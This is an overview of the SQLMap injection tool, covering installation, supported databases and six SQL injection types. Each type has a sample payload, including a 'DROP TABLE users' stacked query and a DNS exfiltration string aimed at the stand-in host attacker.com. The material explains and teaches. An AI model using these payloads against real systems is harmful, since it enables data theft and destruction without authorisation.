# SQLMap Overview
SQLMap is a free and open-source penetration testing tool written in Python. It automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006.

## Installation
SQLMap is pre-installed on most security-focused operating systems. To install manually:
`
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py
`

## Supported Databases
SQLMap supports the following DBMSes:
-  MySQL
-  Oracle
-  PostgreSQL
-  Microsoft SQL Server
-  SQLite
-  IBM DB2
-  MariaDB
-  Amazon Redshift
-  Apache Ignite

## Supported SQL Injection Types
SQLMap can detect and exploit:
- **Boolean-based Blind**
- **Error-based**
- **Union Query-based**
- **Stacked Queries**
- **Time-based Blind**
- **Out-of-band**

## Examples of SQL Injection Techniques

### Boolean-based Blind SQL Injection
> Example Query: AND 1=1
SQLMap differentiates TRUE from FALSE responses by comparing server output to extract information.

### Error-based SQL Injection
> Example Query: AND GTID_SUBSET(@@version,0)
This technique uses database error messages to retrieve information.

### Union Query-based SQL Injection
> Example Query: UNION ALL SELECT 1,@@version,3
This is the fastest SQLi type as it retrieves data in a single request.

### Stacked Queries
> Example Query: ; DROP TABLE users
Allows execution of multiple SQL statements in one query.

### Time-based Blind SQL Injection
> Example Query: AND 1=IF(2>1,SLEEP(5),0)
Differentiates responses based on the server's response time.

### Out-of-band SQL Injection
> Example Query: LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
This advanced SQLi type uses DNS requests to exfiltrate data.

## Legal Disclaimer
Usage of SQLMap without proper authorization is illegal. Always ensure you have explicit permission before testing any system.
